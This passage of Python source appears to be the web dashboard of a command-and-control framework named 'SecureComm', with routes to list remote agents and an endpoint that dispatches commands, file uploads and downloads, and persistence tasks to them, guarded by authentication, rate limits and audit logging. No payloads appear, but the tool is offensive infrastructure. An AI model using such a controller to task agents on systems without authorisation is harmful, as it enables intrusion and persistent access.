    
    async def api_agents(request: web.Request) -> web.Response:
        operational_db.reload()
        return web.json_response({
            "agents": [a.to_dict() for a in operational_db.list_agents()]
        })
    
    async def api_agent_detail(request: web.Request) -> web.Response:
        agent_id = request.match_info.get("agent_id", "")
        agent = operational_db.get_agent(agent_id)
        
        if not agent:
            return web.json_response({"error": "Agent not found"}, status=404)
        
        # Get agent's commands
        agent_commands = [c.to_dict() for c in operational_db.list_commands() if c.agent_id == agent_id]
        
        return web.json_response({
            "agent": agent.to_dict(),
            "commands": agent_commands
        })
    
    async def api_commands(request: web.Request) -> web.Response:
        operational_db.reload()
        commands = operational_db.list_commands()
        commands.sort(key=lambda c: c.created_at, reverse=True)
        
        return web.json_response({
            "commands": [c.to_dict() for c in commands]
        })
    
    async def api_audit(request: web.Request) -> web.Response:
        entries = _load_audit_entries(audit_log_dir, limit=500)
        return web.json_response({
            "entries": entries
        })
    
    async def api_stats(request: web.Request) -> web.Response:
        stats = _calculate_stats(operational_db, start_time)
        return web.json_response(stats.to_dict())
    
    async def submit_command(request: web.Request) -> web.Response:
        agent_id: Optional[str] = None
        cmd_type: Optional[str] = None
        
        def reject(reason: str, status: int = 400, extra: Optional[Dict] = None) -> web.Response:
            if audit_logger:
                details = {"reason": reason, **(extra or {})}
                if operator_id:
                    details["operator_id"] = operator_id
                if agent_id:
                    details["agent_id"] = agent_id
                audit_logger.log_security_event("dashboard_command_rejected", details)
            return web.json_response({"error": reason}, status=status)
        
        try:
            payload = await request.json()
        except Exception:
            return reject("invalid_json")
        
        if not isinstance(payload, dict):
            return reject("invalid_payload")
        
        agent_id = payload.get("agent_id", "").strip()
        cmd_type = payload.get("type", "").strip().lower()
        raw_payload = payload.get("payload", "")
        
        # Validate agent ID format (alphanumeric and underscore only)
        if not agent_id:
            return reject("invalid_agent_id")
        if not all(c.isalnum() or c == "_" for c in agent_id):
            return reject("invalid_agent_id: must be alphanumeric or underscore")
        if len(agent_id) > 255:
            return reject("invalid_agent_id: too long")
        
        # Validate command type
        if not cmd_type:
            return reject("invalid_type")
        if cmd_type not in ALLOWED_DASHBOARD_COMMANDS:
            return reject("invalid_command_type")
        
        # Validate and sanitize payload
        try:
            if cmd_type in ("upload", "download"):
                # File transfer validation
                path = payload.get("path", "")
                if not path or len(path) > PATH_MAX_LENGTH:
                    return reject("invalid_path")
                path = security.sanitize_input(path, max_length=PATH_MAX_LENGTH)
                payload_str = json.dumps({"path": path})
            else:
                # Regular command validation
                if isinstance(raw_payload, dict):
                    raw_payload = raw_payload.get("command", "")
                if not isinstance(raw_payload, str):
                    return reject("invalid_payload")
                payload_str = security.sanitize_input(raw_payload, max_length=COMMAND_PAYLOAD_LIMIT)
            
            if cmd_type == "persist" and not PERSISTENCE_ALLOWED:
                return reject("persistence_disabled", status=403)
                
        except SecurityError as exc:
            return reject(str(exc))
        
        # Authenticate and send command
        try:
            auth_token = get_operator_token()
        except Exception as exc:
            return reject("operator_auth_failed", status=403, extra={"detail": str(exc)})
        
        if not operational_db.get_agent(agent_id):
            return reject("agent_not_found", status=404)
        
        # Check rate limiting
        try:
            security.check_rate_limit(agent_id)
        except SecurityError as exc:
            return reject(str(exc), status=429)  # 429 Too Many Requests
        
        # Check if command server is available (only needed for actual dispatch)
        if not command_server:
            return reject("command_server_unavailable", status=503)
        
        try:
            task_id = command_server.send_command(
                agent_id=agent_id,
                cmd_type=cmd_type,
                payload=payload_str,
                auth_token=auth_token,
            )
            
            # Broadcast update via WebSocket
            await ws_manager.broadcast_event("command_sent", {
                "task_id": task_id,
                "agent_id": agent_id,
                "type": cmd_type
            })
            
        except SecurityError as exc:
            return reject(str(exc))
        except ValueError as exc:
            return reject(str(exc), status=409)
        except Exception as exc:
            return reject("command_dispatch_failed", status=500, extra={"detail": str(exc)})
        
        if audit_logger:
            audit_logger.log_security_event("dashboard_command_submitted", {
                "agent_id": agent_id,
                "command": cmd_type,
                "task_id": task_id,
                "operator_id": operator_id,
            })
        
        return web.json_response({"task_id": task_id, "status": "sent"})
    
    # Page handlers
    async def page_dashboard(request: web.Request) -> web.Response:
        stats = _calculate_stats(operational_db, start_time)
        content = _render_dashboard_page(operational_db, stats, token or "")
        html = _render_html_template("Dashboard", content, 0, token or "")
        return web.Response(text=html, content_type="text/html")
    
    async def page_agents(request: web.Request) -> web.Response:
        content = _render_agents_page(operational_db)
        html = _render_html_template("Agents", content, 0, token or "")
        return web.Response(text=html, content_type="text/html")
    
    async def page_commands(request: web.Request) -> web.Response:
        content = _render_commands_page(operational_db)
        html = _render_html_template("Commands", content, 0, token or "")
        return web.Response(text=html, content_type="text/html")
    
    async def page_audit(request: web.Request) -> web.Response:
        content = _render_audit_page(audit_log_dir)
        html = _render_html_template("Audit Log", content, 0, token or "")
        return web.Response(text=html, content_type="text/html")
    
    async def page_files(request: web.Request) -> web.Response:
        content = _render_files_page()
        html = _render_html_template("File Manager", content, 0, token or "")
        return web.Response(text=html, content_type="text/html")
    
    async def page_stats(request: web.Request) -> web.Response:
        stats = _calculate_stats(operational_db, start_time)
        content = _render_stats_page(stats)
        html = _render_html_template("Statistics", content, 0, token or "")
        return web.Response(text=html, content_type="text/html")
    
    # Create application
    app = web.Application(middlewares=[
        _auth_middleware(token),
        _security_headers_middleware()
    ])
    
    # Routes
    app.router.add_get("/", page_dashboard)
    app.router.add_get("/agents", page_agents)
    app.router.add_get("/commands", page_commands)
    app.router.add_get("/audit", page_audit)
    app.router.add_get("/files", page_files)
    app.router.add_get("/stats", page_stats)
    
    # API Routes
    app.router.add_get("/health", health_check)
    app.router.add_get("/api/state", api_state)
    app.router.add_get("/api/agents", api_agents)
    app.router.add_get("/api/agents/{agent_id}", api_agent_detail)
    app.router.add_get("/api/commands", api_commands)
    app.router.add_get("/api/audit", api_audit)
    app.router.add_get("/api/stats", api_stats)
    app.router.add_post("/api/command", submit_command)
    
    # WebSocket
    app.router.add_get("/ws", websocket_handler)
    
    # Static files
    static_path = Path(__file__).resolve().parents[2] / "dashboard"
    if static_path.exists():
        app.router.add_static("/static", static_path)
    
    # Store references for cleanup
    app["ws_manager"] = ws_manager
    app["command_server"] = command_server
    app["audit_logger"] = audit_logger
    
    logger.info("Dashboard application created successfully")
    return app


def run_dashboard(
    host: str = DASHBOARD_HOST,
    port: int = DASHBOARD_PORT,
    refresh_seconds: int = DASHBOARD_REFRESH_SECONDS,
    token: Optional[str] = DASHBOARD_TOKEN,
) -> None:
    """Run the dashboard server"""
    app = create_app(
        db_path=OPERATIONAL_DB_PATH,
        audit_log_dir=AUDIT_LOG_DIR,
        refresh_seconds=refresh_seconds,
        token=token,
    )
    
    print(f"""
🔥 SecureComm Dashboard v2.0 🔥
═══════════════════════════════════════════════════════════════

Dashboard URL: http://{host}:{port}
API Endpoint:  http://{host}:{port}/api
WebSocket:     ws://{host}:{port}/ws

Press Ctrl+C to stop

═══════════════════════════════════════════════════════════════
""")
    
    web.run_app(app, host=host, port=port)


if __name__ == "__main__":
    run_dashboard()
